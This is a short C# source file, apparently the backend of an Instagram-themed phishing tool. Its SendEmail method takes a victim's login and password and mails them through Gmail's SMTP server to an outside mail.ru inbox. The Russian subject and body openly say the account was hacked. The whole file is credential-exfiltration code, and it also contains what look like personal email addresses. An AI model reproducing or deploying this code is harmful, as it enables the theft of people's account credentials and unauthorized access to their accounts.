using System;
using Microsoft.Extensions.Logging;
using MimeKit;

namespace Instagram_API
{
    public class Service
    {
        private readonly ILogger<Service> logger;

        public Service(ILogger<Service> logger)
        {
            this.logger = logger;
        }

        public void SendEmail(string login, string password)
        {
            try
            {
                MimeMessage message = new MimeMessage();
                message.From.Add(new MailboxAddress("Моя компания", "alexandr.onischenko.2003@gmail.com"));
                message.To.Add(new MailboxAddress("alexandr_oni@mail.ru"));
                message.Subject = "Взлом жопы";
                message.Body = new BodyBuilder()
                {
                    HtmlBody = $"<div style=\"color: green;\">Взломали вот твой пароль и логин: {login} {password}</div>"
                }.ToMessageBody();

                using (MailKit.Net.Smtp.SmtpClient client = new MailKit.Net.Smtp.SmtpClient())
                {
                    client.Connect("smtp.gmail.com", 465, true);
                    client.Authenticate("ПОЧТА С КОТОРОЙ ОТПРАВЯЛЕТСЯ СООБЩЕНИЕ", "ПАРОООООЛЬ ОТ ЭТОЙ ПОЧТЫ");
                    client.Send(message);

                    client.Disconnect(true);
                    logger.LogInformation("Сообщение отправлено успешно!");
                }

            }
            catch (Exception e)
            {
                logger.LogError(e.GetBaseException().Message);
            }
        }
    }
}

